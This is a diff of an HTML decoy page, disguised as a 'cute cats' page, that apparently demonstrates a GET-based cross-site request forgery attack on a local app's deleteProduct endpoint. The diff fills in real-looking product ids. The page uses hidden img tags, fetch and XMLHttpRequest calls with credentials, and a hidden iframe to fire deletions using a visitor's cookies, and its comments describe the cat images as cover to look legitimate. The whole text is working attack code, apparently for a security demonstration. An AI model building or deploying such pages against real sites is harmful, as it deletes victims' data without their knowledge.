@@ -20,41 +20,42 @@
         <h2>Loading cute cats...</h2>
         
         <!-- Malicious img tag that triggers a GET request -->
-        <img src="http://localhost:3000/api/deleteProduct/123" 
+        <img src="http://localhost:3000/api/deleteProduct/684c18d67d2a35ef60c05304" 
              style="display:none" 
              onerror="console.log('Product deletion attempted via img tag')">
         
         <!-- Malicious script tag that triggers a GET request -->
         <script>
             // This will execute when the page loads
-            fetch('http://localhost:3000/api/deleteProduct/456', {
+            fetch('http://localhost:3000/api/deleteProduct/684c18d67d2a35ef60c05304', {
                 credentials: 'include'  // Include cookies in the request
             }).then(() => console.log('Product deletion attempted via script tag'));
         </script>
 
         <!-- Fake cat images to make the page look legitimate -->
-        <img src="https://placekitten.com/400/300" alt="Cute cat 1">
-        <img src="https://placekitten.com/401/300" alt="Cute cat 2">
+        <img src="../FrontEnd/src/images/cat1.jpg" width="200" alt="Cute cat 1">
+
+        <img src="../FrontEnd/src/images/cat2.jpg" width="200" alt="Cute cat 2">
     </div>
 
     <script>
         // Additional demonstration of GET-based CSRF
         function demonstrateGetCsrf() {
             // Method 1: Using fetch
-            fetch('http://localhost:3000/api/deleteProduct/789', {
+            fetch('http://localhost:3000/api/deleteProduct/684e7ce6aae578598678b89f', {
                 credentials: 'include'
             });
 
             // Method 2: Using XMLHttpRequest
             const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'http://localhost:3000/api/deleteProduct/101112', true);
+            xhr.open('GET', 'http://localhost:3000/api/deleteProduct/684e7ce6aae578598678b89f', true);
             xhr.withCredentials = true;
             xhr.send();
 
             // Method 3: Using an iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = 'http://localhost:3000/api/deleteProduct/131415';
+            iframe.src = 'http://localhost:3000/api/deleteProduct/684e7ce6aae578598678b89f';
             document.body.appendChild(iframe);
         }
 
